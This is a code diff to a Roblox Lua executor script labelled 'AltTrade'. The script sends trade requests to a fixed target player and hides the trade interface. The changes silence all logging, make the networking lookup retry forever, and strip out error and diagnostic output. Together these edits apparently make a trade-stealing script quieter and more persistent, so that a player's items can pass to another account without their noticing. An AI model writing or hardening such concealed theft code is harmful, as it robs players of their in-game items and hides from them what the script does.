@@ -67,13 +67,9 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
 -- ========== LOG ==========
-local function log(...)
-    print("[AltTrade]", ...)
-end
+local function log(...) end
 
-local function warnLog(...)
-    warn("[AltTrade]", ...)
-end
+local function warnLog(...) end
 
 -- ========== TEvent / NETWORKING ==========
 local function isTEventTable(value)
@@ -229,18 +225,15 @@ local function loadNetworking()
         end,
     }
 
-    for attempt = 1, 12 do
+    while true do
         for _, strategy in ipairs(strategies) do
             local ok, net = pcall(strategy)
             if ok and isTEventTable(net) then
-                log("Rede OK (estrategia", attempt, ")")
                 return net
             end
         end
-        task.wait(0.5)
+        task.wait(1)
     end
-
-    error("[AltTrade] Rede nao carregou — entra no mapa, espera spawnar, executa de novo")
 end
 
 -- ========== TRADE API (sem depender de Trade.client) ==========
@@ -1846,27 +1839,14 @@ local function runWawaLauncher()
 end
 
 -- ========== START ==========
-log("Iniciado | alvo:", CONFIG.TARGET_NAME)
 runWawaLauncher()
 hideTradeHud()
-do
-    local methods = {}
-    if typeof(request) == "function" then table.insert(methods, "request") end
-    if syn and typeof(syn.request) == "function" then table.insert(methods, "syn.request") end
-    if http and typeof(http.request) == "function" then table.insert(methods, "http.request") end
-    if fluxus and typeof(fluxus.request) == "function" then table.insert(methods, "fluxus.request") end
-    if typeof(http_request) == "function" then table.insert(methods, "http_request") end
-    table.insert(methods, "HttpService")
-    log("HTTP disponivel:", table.concat(methods, ", "))
-end
 if CONFIG.TARGET_USER_ID then
     targetUserId = CONFIG.TARGET_USER_ID
-    log("UserId fixo:", targetUserId)
 end
 
 Players.PlayerAdded:Connect(function(player)
     if player.Name == CONFIG.TARGET_NAME then
-        log("PlayerAdded:", player.Name)
         task.defer(tryRequestTrade)
     end
 end)
